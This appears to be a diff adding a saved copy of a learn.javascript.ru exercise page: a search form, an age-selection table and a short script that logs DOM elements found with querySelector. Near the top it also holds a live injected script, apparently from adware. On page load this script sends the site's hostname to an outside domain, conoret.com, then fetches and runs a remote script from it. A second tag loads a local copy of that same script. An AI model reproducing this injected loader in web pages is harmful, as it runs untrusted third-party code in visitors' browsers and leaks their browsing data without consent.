@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<!-- saved from url=(0057)https://learn.javascript.ru/task/find-elements/table.html -->
+<html><head>
+    
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script src="./table_files/dsp" type="text/javascript" defer="" async=""></script>
+    </head>
+    <body>
+        <script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+  <form name="search">
+    <label>Search the site:
+      <input type="text" name="search">
+    </label>
+    <input type="submit" value="Search!">
+  </form>
+
+  <hr>
+
+  <form name="search-person">
+    Search the visitors:
+    <table id="age-table">
+      <tbody><tr>
+        <td>Age:</td>
+        <td id="age-list">
+          <label>
+            <input type="radio" name="age" value="young">less than 18</label>
+          <label>
+            <input type="radio" name="age" value="mature">18-50</label>
+          <label>
+            <input type="radio" name="age" value="senior">more than 50</label>
+        </td>
+      </tr>
+
+      <tr>
+        <td>Additionally:</td>
+        <td>
+          <input type="text" name="info[0]">
+          <input type="text" name="info[1]">
+          <input type="text" name="info[2]">
+        </td>
+      </tr>
+
+    </tbody></table>
+
+    <input type="submit" value="Search!">
+  </form>
+
+  <script>
+
+    const ageTable = document.getElementById('age-table');
+    const labelsInTable = ageTable.querySelectorAll('label');
+    const firstTd = ageTable.querySelector('td');
+    const searchForm = document.querySelector('form[name="search"]');
+    const firstInputInForm = searchForm.querySelector('input');
+    const inputsInForm = searchForm.querySelectorAll('input');
+    const lastInputInForm = inputsInForm[inputsInForm.length - 1];
+
+    console.log('1. Таблица с id="age-table":', ageTable);
+    console.log('2. Все элементы label внутри таблицы:', labelsInTable);
+    console.log('3. Первый td в таблице:', firstTd);
+    console.log('4. Форма с name="search":', searchForm);
+    console.log('5. Первый input в форме:', firstInputInForm);
+    console.log('6. Последний input в форме:', lastInputInForm);
+</script>
+
+
+</body></html>
